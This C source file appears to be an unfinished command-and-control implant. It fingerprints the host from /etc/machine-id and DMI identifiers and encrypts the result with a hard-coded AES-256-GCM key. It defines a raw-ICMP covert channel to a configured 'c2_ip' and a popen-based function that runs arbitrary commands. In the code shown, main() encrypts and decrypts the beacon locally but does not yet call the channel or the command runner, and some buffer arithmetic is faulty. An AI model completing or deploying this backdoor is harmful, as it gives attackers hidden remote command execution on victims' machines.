#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <zlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <poll.h>

#define MAX_PAYLOAD_SIZE 1400

static const unsigned char ENCRYPTION_KEY[32] = {
	0x4e, 0xc9, 0x17, 0xa3, 0x58, 0xd2, 0x6b, 0xf0,
	0x91, 0x3a, 0xe5, 0x27, 0xc4, 0x88, 0x1d, 0x6a,
	0xf3, 0x0b, 0x59, 0xd8, 0x72, 0x41, 0xae, 0x96,
	0x05, 0xb7, 0xce, 0x23, 0xda, 0x64, 0x18, 0x9f
};

struct Config {
	struct in_addr c2_ip;
	int minimum_poll_seconds;
	int maximum_poll_seconds;
	int compression_level;
};

uint64_t get_device_id(){

	const char *paths[] = {
		"/etc/machine-id",
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
		"/sys/class/dmi/id/product_uuid"
	};

	uint64_t id = UINT64_C(14695981039346656037);

	for (int i = 0; i < 4; i++) {

		FILE *file = fopen(paths[i], "r");
		if (file == NULL) {
			return 1;
		}

		int character;
		while ((character = fgetc(file)) != EOF) {
			if (character == '\n' || character == '\r') {
				continue;
			}
			id ^= (unsigned char)character;
			id *= UINT64_C(1099511628211);
		}
		fclose(file);

		id ^= 255;
		id *= UINT64_C(1099511628211);
	}

	return id;

}

uint16_t calculate_checksum(const unsigned char *data, size_t length) {

	uint32_t checksum = 0;
	while (length >= 2) {
		checksum += ((uint32_t)data[0] << 8) | data[1];
		data += 2;
		length -= 2;
	}

	if (length == 1) {
		checksum += (uint32_t)data[0] << 8;
	}

	while (checksum >> 16) {
		checksum = (checksum & 0xffffu) + (checksum >> 16);
	}

	return (uint16_t)~checksum;

}

ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, const unsigned char *data_to_send, size_t data_to_send_size, unsigned char *received_data) {

	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

	struct sockaddr_in destination = {0};
	destination.sin_family = AF_INET;
	destination.sin_addr = destination_ip;

	unsigned char request[8 + MAX_PAYLOAD_SIZE] = {0};
	uint16_t identifier = (uint16_t)getpid();
	request[0] = ICMP_ECHO;
	request[4] = (unsigned char)(identifier >> 8);
	request[5] = (unsigned char)identifier;
	request[6] = (unsigned char)(sequence >> 8);
	request[7] = (unsigned char)sequence;
	memcpy(request + 8, data_to_send, data_to_send_size);
	uint16_t checksum = calculate_checksum(request, sizeof(request) + data_to_send_size);
	request[2] = (unsigned char)(checksum >> 8);
	request[3] = (unsigned char)checksum;

	sendto(fd, request, sizeof(request) + data_to_send_size, 0, (struct sockaddr *)&destination, sizeof(destination));


	struct pollfd waiting_socket = {
		.fd = fd,
		.events = POLLIN
	};

	struct timespec start_time, current_time;
	clock_gettime(CLOCK_MONOTONIC, &start_time);
	int remaining_time = 30000;

	while (remaining_time > 0) {

		clock_gettime(CLOCK_MONOTONIC, &current_time);
		int64_t elapsed_time = (int64_t)(current_time.tv_sec - start_time.tv_sec) * 1000 + (current_time.tv_nsec - start_time.tv_nsec) / 1000000;
		remaining_time = 30000 - (int)elapsed_time;

		poll(&waiting_socket, 1, remaining_time);
		unsigned char response[2048];
		struct sockaddr_in sender = {0};
		socklen_t sender_length = sizeof(sender);
		size_t response_length = recvfrom(fd, response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_length);
		size_t ip_header_length = (response[0] & 0x0f) * 4;
		if (response_length < 28 || (response[0] >> 4) != 4 || ip_header_length < 20 || response_length < ip_header_length + 8) {
			continue;
		}
		unsigned char *reply = response + ip_header_length;
		if (sender.sin_addr.s_addr != destination_ip.s_addr || reply[0] != ICMP_ECHOREPLY || reply[1] != 0 || memcmp(reply + 4, request + 4, 4) != 0 || calculate_checksum(reply, response_length - ip_header_length) != 0) {
			continue;
		}

		size_t reply_data_size = response_length - ip_header_length - 8;
		memcpy(received_data, reply + 8, reply_data_size);

		close(fd);
		return (ssize_t)reply_data_size;

	}

	close(fd);
	return -1;
}

unsigned char *execute_task(const char *command, size_t *output_size) {

	FILE *process = popen(command, "r");

	size_t capacity = 4096;
	size_t used_bytes = 0;
	unsigned char *output = malloc(capacity);
	size_t bytes_read;

	while ((bytes_read = fread(output + used_bytes, 1, capacity - used_bytes, process)) > 0) {
		used_bytes += bytes_read;
		if (used_bytes == capacity) {
			capacity *= 2;
			output = realloc(output, capacity);
		}
	}

	pclose(process);

	*output_size = used_bytes;
	return output;

}

int main() {

	struct Config configuration = {
		.minimum_poll_seconds = 1,
		.maximum_poll_seconds = 3,
		.compression_level = 6
	};

	uint64_t device_id = get_device_id();

	inet_pton(AF_INET, "192.168.67.20", &configuration.c2_ip);
	srand((int)time(NULL) ^ (int)getpid());

	char message[512];
	sprintf(message, "%016" PRIx64, device_id);
	uLong message_length = strlen(message);
	uLongf compressed_length = compressBound(message_length);
	unsigned char *compressed_data = malloc(compressed_length);
	compress2(compressed_data, &compressed_length, (const unsigned char *)message, message_length, configuration.compression_level);

	unsigned char nonce[12];
	unsigned char authentication_tag[16];
	unsigned char *encrypted_data = malloc(compressed_length);
	RAND_bytes(nonce, sizeof(nonce));
	EVP_CIPHER_CTX *encryption_context = EVP_CIPHER_CTX_new();
	int encrypted_length = 0;
	int final_length = 0;
	EVP_EncryptInit_ex(encryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
	EVP_EncryptUpdate(encryption_context, encrypted_data, &encrypted_length, compressed_data, (int)compressed_length);
	EVP_EncryptFinal_ex(encryption_context, encrypted_data + encrypted_length, &final_length);
	encrypted_length += final_length;
	EVP_CIPHER_CTX_ctrl(encryption_context, EVP_CTRL_AEAD_GET_TAG, sizeof(authentication_tag), authentication_tag);
	EVP_CIPHER_CTX_free(encryption_context);

	size_t payload_length = sizeof(nonce) + sizeof(authentication_tag) + encrypted_length;
	unsigned char *payload = malloc(payload_length);
	memcpy(payload, nonce, sizeof(nonce));
	memcpy(payload + sizeof(nonce), authentication_tag, sizeof(authentication_tag));
	memcpy(payload + sizeof(nonce) + sizeof(authentication_tag), encrypted_data, encrypted_length);











	unsigned char *decrypted_data = malloc(encrypted_length);
	EVP_CIPHER_CTX *decryption_context = EVP_CIPHER_CTX_new();
	int decrypted_length = 0;
	int final_decrypted_length = 0;
	EVP_DecryptInit_ex(decryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
	EVP_DecryptUpdate(decryption_context, decrypted_data, &decrypted_length, encrypted_data, encrypted_length);
	EVP_CIPHER_CTX_ctrl(decryption_context, EVP_CTRL_AEAD_SET_TAG, sizeof(authentication_tag), authentication_tag);
	EVP_DecryptFinal_ex(decryption_context, decrypted_data + decrypted_length, &final_decrypted_length);
	EVP_CIPHER_CTX_free(decryption_context);
	decrypted_length += final_decrypted_length;

	unsigned char decompressed_data[64];
	uLongf decompressed_length = sizeof(decompressed_data) - 1;
	uncompress(decompressed_data, &decompressed_length, decrypted_data, (uLong)decrypted_length);














	free(compressed_data);
	free(encrypted_data);
	free(decrypted_data);
	free(payload);

	return 0;
}

